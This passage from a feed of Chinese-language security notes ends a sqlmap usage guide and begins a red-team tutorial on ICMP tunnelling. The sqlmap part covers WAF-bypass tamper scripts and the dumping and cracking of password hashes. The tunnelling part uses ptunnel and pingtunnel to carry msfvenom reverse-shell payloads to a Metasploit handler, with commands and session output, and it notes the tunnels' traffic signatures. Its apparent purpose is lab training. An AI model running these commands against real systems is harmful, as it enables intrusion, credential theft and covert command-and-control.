class=\"language-text\"><code>www.target1.com/vuln1.php?q=foobar\n\nwww.target2.com/vuln2.asp?id=1\n\nwww.target3.com/vuln3/id/1*\n</code></pre></div><p><strong>从文件中加载HTTP请求</strong></p>\n<p>参数：<code>-r</code></p>\n<p><code>sqlmap</code>可以从一个文本文件中获取<code>HTTP</code>请求，这样就可以跳过设置一些其他参数（比如<code>cookie，POST</code>数据，等等）。</p>\n<p>比如文本文件内如下：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>POST /vuln.php HTTP/1.1\n\nHost: www.target.com\n\nUser-Agent: Mozilla/4.0\n\nid=1\n</code></pre></div><p>当请求是HTTPS的时候你需要配合这个<code>–force-ssl</code>参数来使用，或者你可以在Host头后面加上:<code>443</code></p>\n<p><strong>处理Google的搜索结果</strong></p>\n<p>参数：<code>-g</code></p>\n<p><code>sqlmap</code>可以测试注入<code>Google</code>的搜索结果中的<code>GET</code>参数（只获取前<code>100</code>个结果）。</p>\n<p>例子：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>python sqlmap.py -g \"inurl:\\\".php?id=1\\\"\"\n</code></pre></div><p>此外可以使用-c参数加载sqlmap.conf文件里面的相关配置。</p>\n<h4>请求</h4>\n<p><strong>http数据</strong></p>\n<p>参数：<code>–data</code></p>\n<p>此参数是把数据以<code>POST</code>方式提交，<code>sqlmap</code>会像检测GET参数一样检测<code>POST</code>的参数。</p>\n<p>例子：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>python sqlmap.py -u \"http://www.target.com/vuln.php\" --data=\"id=1\" -f --banner --dbs --users\n</code></pre></div><p><strong>参数拆分字符</strong></p>\n<p>参数：<code>–param-del</code></p>\n<p>当<code>GET</code>或<code>POST</code>的数据需要用其他字符分割测试参数的时候需要用到此参数（默认是&amp;）。</p>\n<p>例子：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>python sqlmap.py -u \"http://www.target.com/vuln.php\" --data=\"query=foobar;id=1\"\n--param-del=\";\" -f --banner --dbs --users\n</code></pre></div><p><strong>HTTP cookie头</strong></p>\n<p>参数：<code>–cookie,–load-cookies,–drop-set-cookie</code></p>\n<p>这个参数在以下两个方面很有用：</p>\n<ol>\n<li>web应用需要登陆的时候。</li>\n<li>你想要在这些头参数中测试SQL注入时。</li>\n</ol>\n<p>可以通过抓包把<code>cookie</code>获取到，复制出来，然后加到<code>–cookie</code>参数里。</p>\n<p>在<code>HTTP</code>请求中，遇到<code>Set-Cookie</code>的话，<code>sqlmap</code>会自动获取并且在以后的请求中加入，并且会尝试<code>SQL</code>注入。</p>\n<p>如果你不想接受<code>Set-Cookie</code>可以使用<code>–drop-set-cookie</code>参数来拒接。</p>\n<p>当你使用<code>–cookie</code>参数时，当返回一个<code>Set-Cookie</code>头的时候，<code>sqlmap</code>会询问你用哪个<code>cookie</code>来继续接下来的请求。</p>\n<p>当<code>–level</code>的参数设定为2或者2以上的时候，<code>sqlmap</code>会尝试注入<code>Cookie</code>参数。</p>\n<p><strong>HTTP User-Agent头</strong></p>\n<p>参数：<code>–user-agent,–random-agent</code></p>\n<p>默认情况下<code>sqlmap</code>的<code>HTTP</code>请求头中<code>User-Agen</code>t值是：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)\n</code></pre></div><p>（这可能直接会被过滤掉或是触发警报，可以使用真实浏览器的<code>useragent</code>，百度一下就有了）</p>\n<p>可以使用<code>–user-anget</code>参数来修改，同时也可以使用<code>–random-agnet</code>参数来随机的从<code>./txt/user-agents.txt</code>中获取。</p>\n<p>当<code>–level</code>参数设定为3或者3以上的时候，会尝试对<code>User-Angent</code>进行注入。</p>\n<p><strong>HTTP Referer头</strong></p>\n<p>参数：<code>–referer</code></p>\n<p><code>sqlmap</code>可以在请求中伪造HTTP中的<code>referer</code>，当<code>–level</code>参数设定为3或者3以上的时候会尝试对referer注入。</p>\n<p><strong>额外的HTTP头</strong></p>\n<p>参数：<code>–headers</code></p>\n<p>可以通过<code>–headers</code>参数来增加额外的http头</p>\n<p><strong>HTTP认证保护</strong></p>\n<p>参数：<code>–auth-type,–auth-cred</code></p>\n<p>这些参数可以用来登陆HTTP的认证保护支持三种方式：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>1. Basic\n\n2. Digest\n\n3. NTLM\n</code></pre></div><p>例子：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>python sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1\"\n--auth-type Basic --auth-cred \"testuser:testpass\"\n</code></pre></div><p><strong>HTTP协议的证书认证</strong></p>\n<p>参数：<code>–auth-cert</code></p>\n<p>当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:<code>key_file，cert_file</code>。</p>\n<p><code>key_file</code>是格式为PEM文件，包含着你的私钥，<code>cert_file</code>是格式为<code>PEM</code>的连接文件。</p>\n<p><strong>HTTP(S)代理</strong></p>\n<p>参数：<code>–proxy,–proxy-cred</code>和<code>–ignore-proxy</code></p>\n<p>使用<code>–proxy</code>代理是格式为：<code>http://url:port。</code></p>\n<p>当<code>HTTP(S)</code>代理需要认证是可以使用<code>–proxy-cred</code>参数：<code>username:password</code>。</p>\n<p><code>–ignore-proxy</code>拒绝使用本地局域网的<code>HTTP(S)</code>代理。</p>\n<p><strong>HTTP请求延迟</strong></p>\n<p>参数：<code>–delay</code></p>\n<p>可以设定两个<code>HTTP(S)</code>请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p>\n<p><strong>设定超时时间</strong></p>\n<p>参数：<code>–timeout</code></p>\n<p>可以设定一个<code>HTTP(S)</code>请求超过多久判定为超时，<code>10.5</code>表示<code>10.5</code>秒，默认是<code>30</code>秒。</p>\n<p><strong>设定重试超时</strong></p>\n<p>参数：<code>–retries</code></p>\n<p>当<code>HTTP(S)</code>超时时，可以设定重新尝试连接次数，默认是3次。</p>\n<p><strong>设定随机改变的参数值</strong></p>\n<p>参数：<code>–randomize</code></p>\n<p>可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样。</p>\n<p>利用正则过滤目标网址</p>\n<p>参数：<code>**–scope**</code></p>\n<p>例如：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>python sqlmap.py -l burp.log --scope=\"(www)?\\.target\\.(com\\|net\\|org)\"\n</code></pre></div><p><strong>避免过多的错误请求被屏蔽</strong></p>\n<p>参数：<code>–safe-url,–safe-freq</code></p>\n<p>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。</p>\n<p><strong>绕过这个策略有两种方式：</strong></p>\n<ol>\n<li><code>--safe-url</code>：提供一个安全不错误的连接，每隔一段时间都会去访问一下。</li>\n<li><code>--safe-freq</code>：提供一个安全不错误的连接，一段频率后会访问一次。</li>\n</ol>\n<p><strong>关掉URL参数值编码</strong></p>\n<p>参数：<code>–skip-urlencode</code></p>\n<p>根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过<code>URL</code>编码的值，这时候就需要用<code>–skip-urlencode</code>参数。</p>\n<p><strong>每次请求时候执行自定义的python代码</strong></p>\n<p>参数：<code>–eval</code></p>\n<p>在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。</p>\n<p>例子：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>python sqlmap.py -u\n\"http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b\"\n--eval=\"import hashlib;hash=hashlib.md5(id).hexdigest()\"\n</code></pre></div><p>上面的请求就是每次请求时根据id参数值，做一次<code>md5</code>后作为<code>hash</code>参数的值。</p>\n<h4>注入</h4>\n<p><strong>测试参数</strong></p>\n<p>参数：<code>-p</code></p>\n<p>如： <code>-p “id,user-anget”</code></p>\n<p><strong>指定要跳过测试的参数</strong></p>\n<p>参数：<code>–skip</code></p>\n<p>如：<code>–skip=”user-angent.referer”</code></p>\n<p>对于伪静态链接，可以在想测试的参数后面加*，它会测试那个指定的参数</p>\n<p>例如：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>python sqlmap.py -u \"http://targeturl/param1/value1\\*/param2/value2/\"\n</code></pre></div><p><strong>指定数据库</strong></p>\n<p>参数：<code>–dbms</code></p>\n<p>不指定会自动探测，如果知道最好指定</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft\nAccess、SQLite、Firebird、Sybase、SAP MaxDB、DB2\n</code></pre></div><p><strong>指定服务器系统</strong></p>\n<p>参数：<code>–os</code></p>\n<p>不指定会自动探测，支持的有：<code>Linux、Windows</code>。</p>\n<p><strong>指定无效的大数字</strong></p>\n<p>参数：<code>–invalid-bignum</code></p>\n<p>当你想指定一个报错的数值时，可以使用这个参数，例如默认情况系<code>id=13，sqlmap</code>会变成<code>id=-13</code>来报错，你可以指定比如<code>id=9999999</code>来报错。</p>\n<p><strong>指定无效的逻辑</strong></p>\n<p>参数：<code>–invalid-logical</code></p>\n<p>原因同上，可以指定<code>id=13</code>把原来的<code>id=-13</code>的报错改成<code>id=13 AND 18=19</code>。</p>\n<p><strong>注入payload</strong></p>\n<p>参数：<code>–prefix,–suffix</code></p>\n<p>在有些环境中，需要在注入的<code>payload</code>的前面或者后面加一些字符，来保证<code>payload</code>的正常执行。</p>\n<p>例如，代码中是这样调用数据库的：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>$query = \"SELECT * FROM users WHERE id=(’\" . $_GET[’id’] . \"’) LIMIT 0, 1\";\n</code></pre></div><p>这时你就需要<code>–prefix</code>和<code>–suffix</code>参数了：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>python sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1\" -p id --prefix\n\"’)\" --suffix \"AND (’abc’=’abc\"\n</code></pre></div><p>这样执行的SQL语句变成：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>$query = \"SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’)\nLIMIT 0, 1\";\n</code></pre></div><p><strong>修改注入的数据</strong></p>\n<p>参数：<code>–tamper</code></p>\n<p><code>sqlmap</code>除了使用<code>CHAR()</code>函数来防止出现单引号之外没有对注入的数据修改，你可以使用<code>–tamper</code>参数对数据做修改来绕过WAF等设备。\n下面是一个<code>tamper</code>脚本的格式：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code># Needed imports\nfrom lib.core.enums import PRIORITY\n# Define which is the order of application of tamper scripts against\n# the payload\n__priority__ = PRIORITY.NORMAL\ndef tamper(payload):\n'''\nDescription of your tamper script\n'''\nretVal = payload\n# your code to tamper the original payload\n# return the tampered payload\nreturn retVal\n</code></pre></div><p>可以查看 <code>tamper/</code> 目录下的有哪些可用的脚本</p>\n<p>例如：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>$ python sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/get_int.php?id=1\" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3\n\n[hh:mm:03] [DEBUG] cleaning up configuration parameters\n[hh:mm:03] [INFO] loading tamper script 'between'\n[hh:mm:03] [INFO] loading tamper script 'randomcase'\n[hh:mm:03] [INFO] loading tamper script 'space2comment'\n[...]\n[hh:mm:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[hh:mm:04] [PAYLOAD] 1)/**/And/**/1369=7706/**/And/**/(4092=4092\n[hh:mm:04] [PAYLOAD] 1)/**/AND/**/9267=9267/**/AND/**/(4057=4057\n[hh:mm:04] [PAYLOAD] 1/**/AnD/**/950=7041\n[...]\n[hh:mm:04] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause'\n[hh:mm:04] [PAYLOAD] 1/**/anD/**/(SELeCt/**/9921/**/fROm(SELeCt/**/counT(*),CONCAT(cHar(\n58,117,113,107,58),(SELeCt/**/(case/**/whEN/**/(9921=9921)/**/THeN/**/1/**/elsE/**/0/**/\nENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)*2))x/**/fROm/**/information_schema.tables/**/\ngroup/**/bY/**/x)a)\n[hh:mm:04] [INFO] GET parameter 'id' is 'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING\nclause' injectable\n[...]\n</code></pre></div><h4>探测</h4>\n<p><strong>探测等级</strong></p>\n<p>参数：<code>–level</code></p>\n<p>共有五个等级，默认为<code>1，sqlmap</code>使用的<code>payload</code>可以在<code>xml/payloads.xml</code>中看到，你也可以根据相应的格式添加自己的<code>payload</code>。</p>\n<p>这个参数不仅影响使用哪些<code>payload</code>同时也会影响测试的注入点，<code>GET</code>和<code>POST</code>的数据都会测试，<code>HTTP Cookie</code>在<code>level</code>为2的时候</p>\n<p>就会测试，<code>HTTP User-Agent/Referer</code>头在<code>level</code>为3的时候就会测试。</p>\n<p>总之在你不确定哪个<code>payload</code>或者参数为注入点的时候，为了保证全面性，建议使用高的<code>level</code>值。</p>\n<p><strong>风险等级</strong></p>\n<p>参数：<code>–risk</code></p>\n<p>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p>\n<p>在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p>\n<p>测试的语句同样可以在<code>xml/payloads.xml</code>中找到，你也可以自行添加<code>payload</code>。</p>\n<p><strong>页面比较</strong></p>\n<p>参数：<code>–string,–not-string,–regexp,–code</code></p>\n<p>默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，</p>\n<p>比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，</p>\n<p>在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用–string参数添加字符串，–regexp添加正则），</p>\n<p>同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（–not-string添加）。</p>\n<p>用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数–code=200。</p>\n<p>参数：<code>–text-only,–titles</code></p>\n<p>有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用–text-only（HTTP响应体中不同）–titles（HTML的title标签中不同）。</p>\n<h4>注入技术</h4>\n<p><strong>测试是否是注入</strong></p>\n<p>参数：<code>–technique</code></p>\n<p>这个参数可以指定<code>sqlmap</code>使用的探测技术，默认情况下会测试所有的方式。</p>\n<p>支持的探测方式如下：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>B: Boolean-based blind SQL injection（布尔型注入）\n\nE: Error-based SQL injection（报错型注入）\n\nU: UNION query SQL injection（可联合查询注入）\n\nS: Stacked queries SQL injection（可多语句查询注入）\n\nT: Time-based blind SQL injection（基于时间延迟注入）\n</code></pre></div><p><strong>设定延迟注入的时间</strong></p>\n<p>参数：<code>–time-sec</code></p>\n<p>当使用继续时间的盲注时，时刻使用<code>–time-sec</code>参数设定延时时间，默认是5秒。</p>\n<p><strong>设定UNION查询字段数</strong></p>\n<p>参数：<code>–union-cols</code></p>\n<p>默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当–level为5的时候他会增加测试到50个字段数。</p>\n<p>设定<code>–union-cols</code>的值应该是一段整数，如：12-16，是测试12-16个字段数。</p>\n<p><strong>设定UNION查询使用的字符</strong></p>\n<p>参数：<code>–union-char</code></p>\n<p>默认情况下<code>sqlmap</code>针对<code>UNION</code>查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，</p>\n<p>这是你可以用<code>–union-char</code>只定UNION查询的字符。</p>\n<p><strong>二阶SQL注入</strong></p>\n<p>参数：<code>–second-order</code></p>\n<p>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。</p>\n<p><code>–second-order</code>后面跟一个判断页面的URL地址。</p>\n<p><strong>列数据</strong></p>\n<p>参数：<code>-b,–banner</code></p>\n<p>大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version这主要取决与是什么数据库。</p>\n<p><strong>用户</strong></p>\n<p>参数：<code>-current-user</code></p>\n<p>在大多数据库中可以获取到管理数据的用户。</p>\n<p><strong>当前数据库</strong></p>\n<p>参数：<code>–current-db</code></p>\n<p>返还当前连接的数据库。</p>\n<p><strong>当前用户是否为管理用</strong></p>\n<p>参数：<code>–is-dba</code></p>\n<p>判断当前的用户是否为管理，是的话会返回True。</p>\n<p><strong>列数据库管理用户</strong></p>\n<p>参数：<code>–users</code></p>\n<p>当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。</p>\n<p><strong>列出并破解数据库用户的hash</strong></p>\n<p>参数：<code>–passwords</code></p>\n<p>当前用户有权限读取包含用户密码的彪的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>$ python sqlmap.py -u \"http://********/sqlmap/pgsql/get_int.php?id=1\" --passwords -v 1\n[...]\nback-end DBMS: PostgreSQL\n[hh:mm:38] [INFO] fetching database users password hashes\ndo you want to use dictionary attack on retrieved password hashes? [Y/n/q] y\n[hh:mm:42] [INFO] using hash method: 'postgres_passwd'\nwhat's the dictionary's location? [/software/sqlmap/txt/wordlist.txt]\n[hh:mm:46] [INFO] loading dictionary from: '/software/sqlmap/txt/wordlist.txt'\ndo you want to use common password suffixes? (slow!) [y/N] n\n[hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)\n[hh:mm:49] [INFO] found: 'testpass' for user: 'testuser'\n[hh:mm:50] [INFO] found: 'testpass' for user: 'postgres'\ndatabase management system users password hashes:\n[*] postgres [1]:\npassword hash: md5d7d880f96044b72d0bba108ace96d1e4\nclear-text password: testpass\n[*] testuser [1]:\npassword hash: md599e5ea7a6f7c3269995cba3927fd0093\nclear-text password: testpass\n</code></pre></div><p>可以看到sqlmap不仅勒出数据库的用户跟密码，同时也识别出是PostgreSQL数据库，并询问用户是否采用字典爆破的方式进行破解，</p>\n<p>这个爆破已经支持<code>Oracle</code>和<code>Microsoft SQL Server</code>。</p>\n<p>也可以提供-U参数来指定爆破哪个用户的<code>hash</code>。</p>\n<p><strong>列出数据库管理员权限</strong></p>\n<p>参数：<code>–privileges</code></p>\n<p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。</p>\n<p>也可以用-U参数指定你想看哪个用户的权限。</p>\n<p><strong>列出数据库管理员角色</strong></p>\n<p>参数：<code>–roles</code></p>\n<p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。</p>\n<p>仅适用于当前数据库是<code>Oracle</code>的时候。</p>\n<p><strong>列出数据库系统的数据库</strong></p>\n<p>参数：<code>–dbs</code></p>\n<p>当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。</p>\n<p><strong>列举数据库表</strong></p>\n<p>参数：<code>–tables,–exclude-sysdbs,-D</code></p>\n<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>sqlmap -u \"http://192.168.163.138/mutillidae/index.php?page=user-info.php&amp;username=111&amp;password=12123&amp;user-info-php-submit-button=View+Account+Details\"\n--tables -D dvwa\n</code></pre></div><p>如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。</p>\n<p>–exclude-sysdbs参数是指包含了所有的系统数据库。</p>\n<p>需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。</p>\n<p><strong>列举数据库表中的字段</strong></p>\n<p>参数：<code>–columns,-C,-T,-D</code></p>\n<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</p>\n<p>如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>$ python sqlmap.py -u \"http://*******/sqlmap/sqlite/get_int.php?id=1\" --columns -D testdb -T users -C name\n[...]\nDatabase: SQLite_masterdb\nTable: users\n[3 columns]\n+</code></pre></div>",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "内网隧道工具使用",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/Tunnel.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/Tunnel.html",
      "summary": "内网隧道工具使用\n1. ICMP隧道\n1.1 ptunnel\n\nThorsten Alteholz / ptunnel · GitLab (debian.org)\n\n主要参数（ptunnel -h可以查看详细信息）\n上线msf\n攻击机：开启ptunnel的server，将client端发过来的icmp流量解析成tcp的\n靶机：开启ptunnel的cli...",
      "content_html": "\n<h2>1. ICMP隧道</h2>\n<h3>1.1 ptunnel</h3>\n<blockquote>\n<p><a href=\"https://salsa.debian.org/alteholz/ptunnel\" target=\"_blank\" rel=\"noopener noreferrer\">Thorsten Alteholz / ptunnel · GitLab (debian.org)</a></p>\n</blockquote>\n<p>主要参数（ptunnel -h可以查看详细信息）</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>-x ：指定ICMP隧道连接的验证密码\n-lp：指定要监听的本地TCP端口\n-da：指定要转发的目标机器的IP地址\n-dp：指定要转发的目标机器的TCP端口\n-p：指定ICMP隧道连一段的IP地址\n</code></pre></div><h4>上线msf</h4>\n<p>攻击机：开启ptunnel的server，将client端发过来的icmp流量解析成tcp的</p>\n<p>靶机：开启ptunnel的client，监听本地的9999端口，ptunnel的client将9999端口接到的流量封装成icmp，发送到server端。</p>\n<p><strong>1）攻击机操作：</strong></p>\n<p>新生成msf马，然后放在靶机上</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=9999 -f elf -o exp\n</code></pre></div><p>攻击机开启msf监听，此处监听的4444端口，后面会用到</p>\n<figure><figcaption>image-20231204182250798</figcaption></figure>\n<p>攻击机开启ptunnel的server  kali自带的，所以直接执行就可以</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>ptunnel \n</code></pre></div><figure><figcaption>image-20231204180659967</figcaption></figure>\n<p><strong>2）靶机操作：</strong></p>\n<p>靶机端执行client</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>./ptunnel -p 100.1.1.169 -lp 9999 -da 100.1.1.169 -dp 4444\n\n# -p   server端的IP\n# -lp  本地监听的端口（只要是这个端口接到的tcp流量，全部封装成icmp,发送到server端）\n# -da -dp 告诉server端，解析后的流量转发到哪个ip和端口，这里填的是msf监听的IP和端口\n</code></pre></div><p>运行可能报错</p>\n<p>解决办法：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>sudo yum install libpcap-devel\n# 安装完可能版本不对\ncd /usr/lib64/\nln -s libpcap.so.1.5.3 libpcap.so.0.8\n</code></pre></div><figure><figcaption>image-20231204181423774</figcaption></figure>\n<p>靶机正常执行后效果如下：</p>\n<figure><figcaption>image-20231205131213945</figcaption></figure>\n<p>然后靶机执行msf马，server端会收到消息，从192.168.1.189接到了icmp流量，解析出来后发现需要转发到100.1.1.169的4444端口</p>\n<figure><figcaption>image-20231205131228617</figcaption></figure>\n<p>上线成功</p>\n<figure><figcaption>image-20231204182013245</figcaption></figure>\n<figure><figcaption>image-20231205131401807</figcaption></figure>\n<p>上面的session看起来是攻击机的IP，其实ptunnel的server端转发过来的，只是ptunnel的server和msf放在同一个攻击机上而已。</p>\n<h4>流量特征</h4>\n<p>先发送1个长度为70的request，然后又2个长度70的reply(内容固定)，接着就一直发送长度为1096的reply包，每秒为一个周期（可以对比下面两图的时间差）,流量包： <a href=\"img%5CTunnel%5Cptunnel_2.pcap\">ptunnel_2.pcap</a>  <a href=\"img%5CTunnel%5Cptunnel_1.pcap\">ptunnel_1.pcap</a></p>\n<figure><figcaption>image-20231205140005738</figcaption></figure>\n<figure><figcaption>image-20231205140103703</figcaption></figure>\n<h3>1.2 pingtunnel</h3>\n<blockquote>\n<p>下面以服务端为server，client端为windows为例（反过来无法上线，不知道为啥）</p>\n</blockquote>\n<h4>基础转发tcp流量</h4>\n<p>简单的通过icmp隧道转发tcp流量，攻击机kali-192.168.73.98</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>./pingtunnel -type server -key 123456\n</code></pre></div><figure><figcaption>image-20240109223556139</figcaption></figure>\n<p>靶机Win-192.168.1.8</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>./pingtunnel.exe -type client -l :8888 -s 192.168.73.98 -t 192.168.73.98:7777 -tcp 1 -key 123456\n</code></pre></div><figure><figcaption>image-20240109223629232</figcaption></figure>\n<p>这样通道就建立起来，192.168.1.8的8888端口收到的tcp流量，都会被转为icmp流量发给server，然后在server端解析成tcp（解析到7777端口）</p>\n<p>假如这样把tcp流量发给192.168.1.8的8888</p>\n<figure><figcaption>image-20240109224512073</figcaption></figure>\n<p>server端可以收到并解析出来</p>\n<figure><figcaption>image-20240109224633925</figcaption></figure>\n<h4>转发TCP上线msf</h4>\n<ul>\n<li>准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端</li>\n</ul>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>./pingtunnel -type server -noprint 1 -nolog 1\n</code></pre></div><ul>\n<li>ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道</li>\n</ul>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>pingtunnel.exe <span class=\"token parameter variable\">-type</span> client <span class=\"token parameter variable\">-l</span> <span class=\"token number\">127.0</span>.0.1:9999 <span class=\"token parameter variable\">-s</span> icmpserver_ip <span class=\"token parameter variable\">-t</span> c2_server_ip:7777 <span class=\"token parameter variable\">-tcp</span> <span class=\"token number\">1</span> <span class=\"token parameter variable\">-noprint</span> <span class=\"token number\">1</span> <span class=\"token parameter variable\">-nolog</span> <span class=\"token number\">1</span>\n<span class=\"token comment\"># 该命令的意思是icmp客户端监听127.0.0.1:9999，通过连接到icmpserver_ip的icmp隧道，将127.0.0.1:9999收到的tcp数据包转发到c2_server_ip:7777</span>\n<span class=\"token comment\"># icmpserver_ip 192.168.1.10</span>\n<span class=\"token comment\"># c2_server_ip 192.168.1.10</span>\n</code></pre></div><p>生成反向payload的meterpreter并上传到ICMP隧道客户端执行即可上线</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>msfvenom <span class=\"token parameter variable\">-p</span> windows/x64/meterpreter/reverse_tcp <span class=\"token assign-left variable\">lhost</span><span class=\"token operator\">=</span><span class=\"token number\">127.0</span>.0.1 <span class=\"token assign-left variable\">lport</span><span class=\"token operator\">=</span><span class=\"token number\">9999</span> <span class=\"token parameter variable\">-f</span> exe <span class=\"token parameter variable\">-o</span> meterpreter.exe\n<span class=\"token comment\"># 这里的lhost和lport为icmp客户端监听ip和端口</span>\n</code></pre></div><p>启动msf监听，等待meterpreter执行上线</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code># 这里的lhost和lport为icmp客户端转发到的ip和端口\n\nmsf6 &gt; use exploit/multi/handler\nmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp\npayload =&gt; windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0\nlhost =&gt; 0.0.0.0\nmsf6 exploit(multi/handler) &gt; set lport 7777\nlport =&gt; 7777\nmsf6 exploit(multi/handler) &gt; run\n\n[*] Started reverse TCP handler on 0.0.0.0:7777 \n[*] Sending stage (200774 bytes) to 192.168.1.10\n[*] Meterpreter session 1 opened (192.168.1.10:7777 -&gt; 192.168.1.10:44832) at 2024-01-15 02:26:28 -0500\n\nmeterpreter &gt; getuid\nServer username: ECHO0D-WIN\\echo0d\n\n</code></pre></div><figure><figcaption>image-20240115153402449</figcaption></figure>\n<h4>转发TCP上线cs</h4>\n<ul>\n<li>准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端</li>\n</ul>\n<div class=\"language-text\" data-ext=\"text\" 